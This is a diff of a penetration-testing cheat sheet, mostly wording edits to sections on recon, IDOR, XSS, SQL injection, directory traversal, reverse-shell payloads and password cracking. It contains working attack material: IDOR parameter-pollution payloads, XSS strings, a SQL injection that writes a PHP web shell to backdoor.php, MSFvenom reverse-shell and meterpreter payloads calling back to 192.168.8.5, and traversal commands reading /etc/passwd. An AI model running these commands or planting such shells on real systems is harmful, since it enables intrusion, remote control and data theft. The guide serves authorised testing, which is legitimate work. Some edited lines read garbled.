+**Don't forget to clean up after yourself. Remove all the created artifacts, incl. malware, exploits, tools, scripts, etc., and revert all the settings and changes from a target host after you are done testing.**
 
 ### 3.1 Useful Websites
 
@@ -1232,7 +1250,7 @@ If you see any amounts or quantities, try to use [danielmiessler/SecLists/tree/m
 
 ### Collaborator Servers
 
-Exploit open redirect, blind cross-site scripting (XSS), DNS/HTTP interaction, etc.
+Used when trying to exploit an open redirect, blind cross-site scripting (XSS), DNS and HTTP interactions, etc.
 
 * [interactsh.com](https://app.interactsh.com)
 * [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
@@ -1245,21 +1263,23 @@ Gather as much information as you can for a specified target, see how in [1. Rec
 
 Gather organization names with [WHOIS](#whois-asn-cidr), and canonical names with [host](#host).
 
-You can double check if domains/subdomains are alive or not with [dig](#dig) and [httpx](#httpx).
+You can double check if domains/subdomains are dead with [dig](#dig) or alive and [httpx](#httpx).
 
 Check if hosting providers for the found domains/subdomains are vulnerable to domain/subdomain takeover at [EdOverflow/can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz). Credits to the author!
 
-Popular cloud service providers:
+Biggest cloud service providers:
 
 * [aws.amazon.com](https://aws.amazon.com)
 * [azure.microsoft.com](https://azure.microsoft.com)
 * [cloud.google.com](https://cloud.google.com)
+* [wordpress.com](https://wordpress.com)
+* [shopify.com](https://www.shopify.com)
 
 ### Subzy
 
 Installation:
 
-```bash
+```fundamental
 go install -v github.com/lukasikic/subzy@latest
 ```
 
@@ -1285,7 +1305,7 @@ subjack -v -o subjack_results.json -t 100 -timeout 3 -a -m -w subdomains_errors.
 
 ### Bypassing the 401 and 403
 
-Find out how to bypass 4xx HTTP response status codes from my other [project](https://github.com/ivan-sincek/forbidden).
+Find out how to bypass 4xx HTTP response status codes at [ivan-sincek/forbidden](https://github.com/ivan-sincek/forbidden).
 
 ### Nikto
 
@@ -1313,9 +1333,9 @@ go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
 nuclei -up && nuclei -ut
 ```
 
-Vulnerability scan (all templates):
+Vulnerability scan, all templates:
 
-```fundamental
+```bash
 nuclei -c 500 -o nuclei_results.txt -l subdomains_live_long_2xx_4xx.txt
 
 cat nuclei_results.txt | grep -Po '(?<=\]\ ).+' | sort -uf > nuclei_sorted_results.txt
@@ -1390,23 +1410,39 @@ wfuzz -t 30 -f wfuzz_results.txt --hc 404,405 -X GET -u "https://somesite.com/so
 
 ### Insecure Direct Object Reference (IDOR)
 
-First, try to simply change one value to another, e.g., change `victim@somedomain.com` to `attacker@somedomain.com`, change some ID from `1` to `2`, etc.
+First, try to simply change one value to another, e.g., change `victim@gmail.com` to `hacker@gmail.com`, change some ID from `1` to `2`, etc.
 
-It is possible that lower number IDs relate to some higher privilege accounts or roles.
+It is likely that lower number IDs will relate to some higher privilege accounts or roles.
 
 Second, try parameter pollution:
 
 ```fundamental
-email=victim@somedomain.com,attacker@somedomain.com
-email=victim@somedomain.com attacker@somedomain.com
+"email":"hacker@gmail.com,victim@gmail.com"
+"email":"hacker@gmail.com victim@gmail.com"
+"email":"hacker@gmail.com","email":"victim@gmail.com"
+"email":"victim@gmail.com,hacker@gmail.com"
+"email":"victim@gmail.com hacker@gmail.com"
+"email":"victim@gmail.com","email":"hacker@gmail.com"
+"email":("hacker@gmail.com","victim@gmail.com")
+"email":["hacker@gmail.com","victim@gmail.com"]
+"email":{"hacker@gmail.com","victim@gmail.com"}
+"email":("victim@gmail.com","hacker@gmail.com")
+"email":["victim@gmail.com","hacker@gmail.com"]
+"email":{"victim@gmail.com","hacker@gmail.com"}
+email=hacker%40gmail.com,victim%40gmail.com
+email=hacker%40gmail.com%20victim%40gmail.com
+email=hacker%40gmail.com&email=victim%40gmail.com
+email[]=hacker%40gmail.com&email[]=victim%40gmail.com
+email=victim%40gmail.com,hacker%40gmail.com
+email=victim%40gmail.com%20hacker%40gmail.com
+email=victim%40gmail.com&email=hacker%40gmail.com
+email[]=victim%40gmail.com&email[]=hacker%40gmail.com
+```
 
-email=victim@somedomain.com&email=attacker@somedomain.com
-email[]=victim@somedomain.com&email[]=attacker@somedomain.com
+To generate the above output, run [idor.py]():
 
-{ "email": "victim@somedomain.com,attacker@somedomain.com" }
-{ "email": "victim@somedomain.com attacker@somedomain.com" }
-
-{ "email": ["victim@somedomain.com", "attacker@somedomain.com"] }
+```fundamental
+python3 idor.py -n email -i victim@gmail.com -t hacker@gmail.com
 ```
 
 ### HTTP Response Splitting
@@ -1427,7 +1463,7 @@ Open redirect:
 somesite.com/home.php?marketing=winter%0D%0ALocation:%20https%3A%2F%2Fgithub.com
 ```
 
-Session fixation and redirection are one of many techniques used in combination with HTTP response splitting. Search the Internet for other examples.
+Session fixation and open redirection are one of many techniques used in combination with HTTP response splitting. Search the Internet for more techniques.
 
 ### Cross-Site Scripting (XSS)
 
@@ -1441,9 +1477,9 @@ Simple cross-site scripting (XSS) payloads:
 <img src="https://github.com/favicon.ico" onload="alert(1)">
 ```
 
-Hosting JavaScript on [Pastebin](https://pastebin.com) doesn't work because Pastebin returns the plain text content-type.
+Hosting JavaScript on [Pastebin](https://pastebin.com) doesn't work because Pastebin returns `text/plain` content-type.
 
-Find out more about reflected and stored cross-site scripting (XSS) attacks, as well as cross-site request forgery (XSRF/CSRF) attacks from my other [project](https://github.com/ivan-sincek/xss-catcher).
+Find out more about reflected and stored cross-site scripting (XSS) attacks, as well as cross-site request forgery (XSRF/CSRF) attacks at [ivan-sincek/xss-catcher](https://github.com/ivan-sincek/xss-catcher).
 
 Valid emails with embedded XSS:
 
@@ -1459,13 +1495,13 @@ user@somedomain(<script>alert(1)</script>).com
 
 **The following payloads were tested on MySQL database. Note that MySQL requires a white space between the comment symbol and the next character.**
 
-If you need to URL encode the white space, use either `%20` or `+`.
+If you need to URL encode the whitespace, use either `%20` or `+`.
 
 Try to produce database errors by injecting a single-quote, back-slash, double-hyphen, forward-slash, or period.
 
 **Always make sure to properly close the surrounding code.**
 
-Read this [article](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF) to learn how to bypass WAF.
+Read this OWASP [article](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF) to learn how to bypass WAF.
 
 ---
 
@@ -1545,7 +1581,7 @@ Inject a [simple PHP web shell](https://github.com/ivan-sincek/php-reverse-shell
 ' UNION SELECT '', '', '', '<?php $p="command";$o=null;if(isset($_SERVER["REQUEST_METHOD"])&&strtolower($_SERVER["REQUEST_METHOD"])==="get"&&isset($_GET[$p])&&($_GET[$p]=trim($_GET[$p]))&&strlen($_GET[$p])>0){$o=@shell_exec("($_GET[$p]) 2>&1");if($o===false){$o="ERROR: The function might be disabled.";}else{$o=str_replace("<","&lt;",$o);$o=str_replace(">","&gt;",$o);}} ?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Simple PHP Web Shell</title><meta name="author" content="Ivan Šincek"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body><pre><?php echo $o;unset($o);unset($_GET[$p]); ?></pre></body></html>' INTO DUMPFILE '..\\..\\htdocs\\backdoor.php'-- 
 ```
 
-To successfully inject a web shell, the current database user must have a write permission.
+**To successfully inject a web shell, the current database user must have a write permission.**
 
 ### sqlmap
 
@@ -1590,7 +1626,7 @@ dotdotpwn -q -m http -o unix -f /etc/passwd -k root -h somesite.com
 dotdotpwn -q -m http-url -o unix -f /etc/hosts -k localhost -u 'https://somesite.com/index.php?file=TRAVERSAL'
 ```
 
-Try to prepend a protocol such as `file://`, `gopher://`, `dict://`, `php://`, `jar://`, `ftp://`, `tftp://`, etc., to the file path; e.g `file://TRAVERSAL`.
+Try to prepend a protocol such as `file://`, `gopher://`, `dict://`, `php://`, `jar://`, `ftp://`, `tftp://`, etc., to the file path; e.g, `file://TRAVERSAL`.
 
 Check some additional directory traversal tips at [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md). Credits to the author!
 
@@ -1615,13 +1651,13 @@ Check some additional directory traversal tips at [swisskyrepo/PayloadsAllTheThi
 
 ### Web Shells
 
-Find out more about PHP shells from my other [project](https://github.com/ivan-sincek/php-reverse-shell).
+Find out more about PHP shells at [ivan-sincek/php-reverse-shell](https://github.com/ivan-sincek/php-reverse-shell).
 
-Find out more about Java/JSP shells from my other [project](https://github.com/ivan-sincek/java-reverse-tcp).
+Find out more about Java/JSP shells at [ivan-sincek/java-reverse-tcp](https://github.com/ivan-sincek/java-reverse-tcp).
 
 ### Send a Payload With Python
 
-Find out how to generate a `reverse shell payload` for Python and send it to a target's machine from my other [project](https://github.com/ivan-sincek/send-tcp-payload).
+Find out how to generate a reverse shell payload for Python and send it to the target machine at [ivan-sincek/send-tcp-payload](https://github.com/ivan-sincek/send-tcp-payload).
 
 ## 4. Post Exploitation
 
@@ -1633,7 +1669,7 @@ Find out how to generate a `reverse shell payload` for Python and send it to a t
 
 ### Generate a Reverse Shell Payload for Windows OS
 
-To generate a `Base64 encoded payload`, use one of the following MSFvenom commands (modify them to your need):
+To generate a `Base64 encoded payload`, use one of the following MSFvenom commands, modify them to your need:
 
 ```fundamental
 msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff | base64 -w 0 > payload.txt
@@ -1645,7 +1681,7 @@ msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter
 msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw | base64 -w 0 > payload.txt
 ```
 
-To generate a `binary file`, use one of the following MSFvenom commands (modify them to your need):
+To generate a `binary file`, use one of the following MSFvenom commands, modify them to your need:
 
 ```fundamental
 msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff -o payload.bin
@@ -1657,7 +1693,7 @@ msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter
 msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -o payload.bin
 ```
 
-To generate a `DLL file`, use one of the following MSFvenom commands (modify them to your need):
+To generate a `DLL file`, use one of the following MSFvenom commands, modify them to your need:
 
 ```fundamental
 msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f dll -b \x00\x0a\x0d\xff -o payload.dll
@@ -1665,7 +1701,7 @@ msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_rever
 msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f dll -b \x00\x0a\x0d\xff -o payload.dll
 ```
 
-To generate a `standalone executable`, file use one of the following MSFvenom commands (modify them to your need):
+To generate a `standalone executable`, file use one of the following MSFvenom commands, modify them to your need:
 
 ```fundamental
 msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -b \x00\x0a\x0d\xff -o payload.exe
@@ -1677,7 +1713,7 @@ msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter
 msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -o payload.exe
 ```
 
-To generate an `MSI file`, use one of the following MSFvenom commands (modify them to your need):
+To generate an `MSI file`, use one of the following MSFvenom commands, modify them to your need:
 
 ```fundamental
 msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f msi -b \x00\x0a\x0d\xff -o payload.msi
@@ -1709,13 +1745,13 @@ To decode a PowerShell encoded command, run the following PowerShell command:
 [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($command))
 ```
 
-Find out more about PowerShell reverse and bind TCP shells from my other [project](https://github.com/ivan-sincek/powershell-reverse-tcp).
+Find out more about PowerShell reverse and bind TCP shells at [ivan-sincek/powershell-reverse-tcp](https://github.com/ivan-sincek/powershell-reverse-tcp).
 
 ## 5. Password Cracking
 
 **Google a hash before trying to crack it because you might save yourself a lot of time and trouble.**
 
-Use [Google Dorks](#google-dorks), [Chad](#chad), or [FOCA](#foca) to find files and within file's metadata domain usernames to brute force.
+Use [Google Dorks](#google-dorks), [Chad](#chad), or [FOCA](#foca) to find and download files, and within file's metadata, domain usernames to brute force.
 
 **Keep in mind that you might lockout people's accounts.**
 
@@ -1971,7 +2007,7 @@ hydra -o hydra_results.txt -l admin -x 4:4:aA1\!\"\#\$\% 192.168.8.5 ftp
 
 After you have collected enough usernames from [reconnaissance phase](#1-reconnaissance), it is time to try and crack some of them.
 
-Find out how to generate a good password spraying wordlist from my other [project](https://github.com/ivan-sincek/wordlist-extender), but first you will need a few good keywords that describe your target.
+Find out how to generate a good password spraying wordlist at [ivan-sincek/wordlist-extender](https://github.com/ivan-sincek/wordlist-extender), but first you will need a few good keywords that describe your target.
 
 Such keywords can be a company name, abbreviations, words that describe your target's services, products, etc.
 
@@ -1983,7 +2019,7 @@ You can also use the generated wordlist with [hashcat](#hashcat), e.g., to crack
 
 ## 6. Social Engineering
 
-Find out how to embed a PowerShell script into an MS Word document from my other [project](https://github.com/ivan-sincek/powershell-reverse-tcp#ms-word).
+Find out how to embed a PowerShell script into an MS Word document at [ivan-sincek/powershell-reverse-tcp](https://github.com/ivan-sincek/powershell-reverse-tcp#ms-word).
 
 ### Drive-by Download
 
@@ -2070,7 +2106,7 @@ Upload a file:
 curl somesite.com/uploads/ -T somefile.txt
 ```
 
-Find out how to test a web server for various HTTP methods and method overrides from my other [project](https://github.com/ivan-sincek/forbidden).
+Find out how to test a web server for various HTTP methods and method overrides at [ivan-sincek/forbidden](https://github.com/ivan-sincek/forbidden).
 
 | Option | Description |
 | --- | --- |
@@ -2124,7 +2160,7 @@ for i in {0..255}; do ncat -nv "192.168.8.${i}" 9000 -w 2 -z 2>&1 | grep -Po '(?
 for ip in $(cat ips.txt); do ncat -nv "${ip}" 9000 -w 2 -z 2>&1 | grep -Po '(?<=Connected\ to\ )[^\s]+(?=\.)'; done
 ```
 
-Find out how to create an SSL/TLS certificate from my other [project](https://github.com/ivan-sincek/secure-website/tree/master/crt).
+Find out how to create an SSL/TLS certificate at [ivan-sincek/secure-website](https://github.com/ivan-sincek/secure-website/tree/master/crt).
 
 ### multi/handler
 
